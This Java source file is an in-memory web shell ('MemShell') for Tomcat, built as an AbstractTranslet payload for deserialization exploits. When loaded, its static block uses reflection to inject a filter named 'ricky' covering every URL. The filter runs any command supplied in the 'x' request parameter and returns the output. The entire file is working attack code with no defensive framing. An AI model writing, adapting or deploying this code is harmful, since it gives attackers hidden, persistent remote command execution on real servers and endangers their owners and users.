import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * tomcat89 MemShell
 * */
public class EvilFilter extends AbstractTranslet implements Filter{

    static {
        try {
            final String filterName = "ricky";
            // WebappClassLoaderBase--->ApplicationContext(getResources().getContext())
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Filter filter = new EvilFilter();

            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);

            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterName);
            filterMap.addURLPattern("/*");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig config = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            Field configfield = standardContext.getClass().getDeclaredField("filterConfigs");
            configfield.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) configfield.get(standardContext);
            filterConfigs.put(filterName, config);

            standardContext.addFilterDef(filterDef);
            standardContext.addFilterMapBefore(filterMap);

        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        if(request.getParameter("x") != null){
            Process process = Runtime.getRuntime().exec(request.getParameter("x"));
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String str = "";
            String line;
            while((line = reader.readLine()) != null){
                str += line;
            }
            servletResponse.getOutputStream().write(str.getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }
    @Override
    public void destroy() {
    }
}


